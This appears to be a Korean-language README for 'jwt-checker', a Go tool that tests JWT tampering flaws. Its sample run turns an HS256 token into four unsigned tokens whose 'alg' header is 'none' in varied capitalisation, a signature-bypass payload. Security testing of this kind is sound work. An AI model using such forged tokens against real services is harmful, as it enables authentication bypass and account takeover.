# jwt-checker
---
- jwt 변조 관련 보안 취약점을 간단하게 테스트하는 도구입니다. (ex: none 알고리즘, lfi, ssrf 등)
- 현재 none 알고리즘 페이로드를 생성하여 콘솔에 출력해주는 기능까지만 구현이 되었습니다. 
(추후에 동적으로 패킷 전송 및 정탐 판별까지 추가 예정)


### 사용 방법
---
```
go run ./cmd/jwt-checker/main.go -h 

Usage of C:\Users\ksw97\AppData\Local\Temp\go-build2744319202\b001\exe\main.exe:
  -m string
        공격 타입 (default "none")
  -t string
        JWT 토큰 입력
```

ex) go run ./cmd/jwt-checker/main.go -m none -t <JWT 토큰>

### 실행 결과
```
go run .\cmd\jwt-checker\main.go -m none -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk


eyJhbGciOiJub25lIiwidHlwIjoiand0In0=.eyJ1c2VybmFtZSI6Imd1ZXN0In0=.
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0=.eyJ1c2VybmFtZSI6Imd1ZXN0In0=.
eyJhbGciOiJOT05FIiwidHlwIjoiand0In0=.eyJ1c2VybmFtZSI6Imd1ZXN0In0=.
eyJhbGciOiJub05lIiwidHlwIjoiand0In0=.eyJ1c2VybmFtZSI6Imd1ZXN0In0=.
```